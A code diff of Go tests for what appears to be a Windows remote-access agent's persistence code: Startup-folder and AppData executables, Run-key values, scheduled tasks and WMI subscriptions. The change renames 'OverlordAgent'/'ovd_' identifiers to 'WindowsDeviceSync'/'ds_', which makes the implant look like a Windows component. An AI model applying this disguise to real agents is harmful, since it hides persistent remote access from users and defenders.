@@ -27,7 +27,7 @@ func TestGetTargetPath_UsesStartupFolderAndRandomizedOvdName(t *testing.T) {
 	}
 	base := strings.ToLower(filepath.Base(got))
 	if !strings.HasPrefix(base, executablePrefix()) || !strings.HasSuffix(base, ".exe") {
-		t.Fatalf("expected randomized ovd_*.exe name, got %q", filepath.Base(got))
+		t.Fatalf("expected randomized ds_*.exe name, got %q", filepath.Base(got))
 	}
 }
 
@@ -39,7 +39,7 @@ func TestGetTargetPath_PrefersExistingPrefixedExecutable(t *testing.T) {
 		t.Fatalf("mkdir startup dir failed: %v", err)
 	}
 
-	expected := filepath.Join(startupDir, "ovd_existing.exe")
+	expected := filepath.Join(startupDir, "ds_existing.exe")
 	if err := os.WriteFile(expected, []byte("x"), 0644); err != nil {
 		t.Fatalf("write startup executable failed: %v", err)
 	}
@@ -60,10 +60,10 @@ func TestIsOverlordRunValueName(t *testing.T) {
 		in   string
 		want bool
 	}{
-		{name: "Legacy", in: "OverlordAgent", want: true},
-		{name: "LegacyCaseInsensitive", in: "overlordagent", want: true},
-		{name: "Randomized", in: "OverlordAgent-a1b2c3d4e5f6", want: true},
-		{name: "RandomizedCaseInsensitive", in: "overlordagent-deadbeefcafe", want: true},
+		{name: "Legacy", in: "WindowsDeviceSync", want: true},
+		{name: "LegacyCaseInsensitive", in: "windowsdevicesync", want: true},
+		{name: "Randomized", in: "DeviceSync-a1b2c3d4e5f6", want: true},
+		{name: "RandomizedCaseInsensitive", in: "devicesync-deadbeefcafe", want: true},
 		{name: "OtherApp", in: "OneDrive", want: false},
 	}
 
@@ -101,7 +101,7 @@ func TestGetTargetPath_NonStartupMethodsUseAppDataBinaryDir(t *testing.T) {
 	}
 	base := strings.ToLower(filepath.Base(got))
 	if !strings.HasPrefix(base, executablePrefix()) || !strings.HasSuffix(base, ".exe") {
-		t.Fatalf("expected ovd_*.exe name, got %q", filepath.Base(got))
+		t.Fatalf("expected ds_*.exe name, got %q", filepath.Base(got))
 	}
 }
 
@@ -150,7 +150,7 @@ func TestGetTargetPath_PrefersExistingBinary_AppDataDir(t *testing.T) {
 	if err := os.MkdirAll(dir, 0755); err != nil {
 		t.Fatalf("mkdir: %v", err)
 	}
-	expected := filepath.Join(dir, "ovd_existing.exe")
+	expected := filepath.Join(dir, "ds_existing.exe")
 	if err := os.WriteFile(expected, []byte("x"), 0644); err != nil {
 		t.Fatalf("write: %v", err)
 	}
@@ -172,7 +172,7 @@ func TestGetTargetPath_MissingAPPDATA(t *testing.T) {
 }
 
 func TestDeriveTaskName_DeterministicAndPrefixed(t *testing.T) {
-	path := `C:\Users\testuser\AppData\Roaming\Microsoft\DeviceSync\ovd_aabbccdd.exe`
+	path := `C:\Users\testuser\AppData\Roaming\Microsoft\DeviceSync\ds_aabbccdd.exe`
 	got1 := deriveTaskName(path)
 	got2 := deriveTaskName(path)
 	if got1 != got2 {
@@ -200,7 +200,7 @@ func TestDeriveTaskName_CaseInsensitive(t *testing.T) {
 }
 
 func TestDeriveWMINames_DeterministicPrefixedAndDistinct(t *testing.T) {
-	path := `C:\Users\testuser\AppData\Roaming\Microsoft\DeviceSync\ovd_aabbccdd.exe`
+	path := `C:\Users\testuser\AppData\Roaming\Microsoft\DeviceSync\ds_aabbccdd.exe`
 	f1, c1 := deriveWMINames(path)
 	f2, c2 := deriveWMINames(path)
 	if f1 != f2 || c1 != c2 {
@@ -255,7 +255,7 @@ func TestFindExistingBinaryInDir_EmptyDir(t *testing.T) {
 
 func TestFindExistingBinaryInDir_FoundMatchingFile(t *testing.T) {
 	dir := t.TempDir()
-	expected := filepath.Join(dir, "ovd_test.exe")
+	expected := filepath.Join(dir, "ds_test.exe")
 	if err := os.WriteFile(expected, []byte("x"), 0644); err != nil {
 		t.Fatalf("write: %v", err)
 	}
@@ -281,7 +281,7 @@ func TestFindExistingBinaryInDir_IgnoresNonMatchingFiles(t *testing.T) {
 
 func TestFindExistingBinaryInDir_IgnoresDirectories(t *testing.T) {
 	dir := t.TempDir()
-	subdir := filepath.Join(dir, "ovd_dir.exe")
+	subdir := filepath.Join(dir, "ds_dir.exe")
 	if err := os.Mkdir(subdir, 0755); err != nil {
 		t.Fatalf("mkdir: %v", err)
 	}
@@ -298,9 +298,9 @@ func TestFindExistingBinaryInDir_NonexistentDir(t *testing.T) {
 	}
 }
 
-func TestCleanupPrefixedExecutables_RemovesOvdFiles(t *testing.T) {
+func TestCleanupPrefixedExecutables_RemovesPrefixedFiles(t *testing.T) {
 	dir := t.TempDir()
-	for _, name := range []string{"ovd_aabbcc.exe", "ovd_112233.exe"} {
+	for _, name := range []string{"ds_aabbcc.exe", "ds_112233.exe"} {
 		if err := os.WriteFile(filepath.Join(dir, name), []byte("x"), 0644); err != nil {
 			t.Fatalf("write %q: %v", name, err)
 		}
@@ -319,7 +319,7 @@ func TestCleanupPrefixedExecutables_RemovesOvdFiles(t *testing.T) {
 	entries, _ := os.ReadDir(dir)
 	for _, e := range entries {
 		if strings.HasPrefix(strings.ToLower(e.Name()), executablePrefix()) {
-			t.Fatalf("ovd_* file %q was not removed", e.Name())
+			t.Fatalf("ds_* file %q was not removed", e.Name())
 		}
 	}
 	if got, want := len(entries), len(keepers); got != want {
@@ -341,7 +341,7 @@ func TestCleanupOverlordRunValues_RemovesMatchingValues(t *testing.T) {
 	}
 	defer k.Close()
 
-	toClean := []string{"OverlordAgent", "OverlordAgent-deadbeef", "OverlordAgent-cafebabe"}
+	toClean := []string{"WindowsDeviceSync", "DeviceSync-deadbeef", "DeviceSync-cafebabe"}
 	for _, name := range toClean {
 		if err := k.SetStringValue(name, `"C:\dummy.exe"`); err != nil {
 			t.Fatalf("write %q: %v", name, err)
@@ -395,8 +395,8 @@ func TestGenerateBinaryName_DefaultName_HasRandomSuffix(t *testing.T) {
 	if err != nil {
 		t.Fatalf("generateBinaryName() error: %v", err)
 	}
-	if !strings.HasPrefix(name, "ovd_") || !strings.HasSuffix(name, ".exe") || name == "ovd_.exe" {
-		t.Fatalf("expected ovd_<hex>.exe, got %q", name)
+	if !strings.HasPrefix(name, "ds_") || !strings.HasSuffix(name, ".exe") || name == "ds_.exe" {
+		t.Fatalf("expected ds_<hex>.exe, got %q", name)
 	}
 }
 
@@ -410,8 +410,8 @@ func TestFindExistingBinaryInDir_CustomName(t *testing.T) {
 	if err := os.WriteFile(expected, []byte("x"), 0644); err != nil {
 		t.Fatalf("write: %v", err)
 	}
-	// Also write an ovd_ file that should NOT be matched
-	if err := os.WriteFile(filepath.Join(dir, "ovd_aabbcc.exe"), []byte("x"), 0644); err != nil {
+	// Also write an ds_ file that should NOT be matched
+	if err := os.WriteFile(filepath.Join(dir, "ds_aabbcc.exe"), []byte("x"), 0644); err != nil {
 		t.Fatalf("write: %v", err)
 	}
 
@@ -434,7 +434,7 @@ func TestCleanupPrefixedExecutables_CustomName(t *testing.T) {
 		t.Fatalf("write: %v", err)
 	}
 	// These should NOT be removed with the custom name set
-	keepers := []string{"ovd_aabbcc.exe", "other.exe"}
+	keepers := []string{"ds_aabbcc.exe", "other.exe"}
 	for _, name := range keepers {
 		if err := os.WriteFile(filepath.Join(dir, name), []byte("x"), 0644); err != nil {
 			t.Fatalf("write %q: %v", name, err)
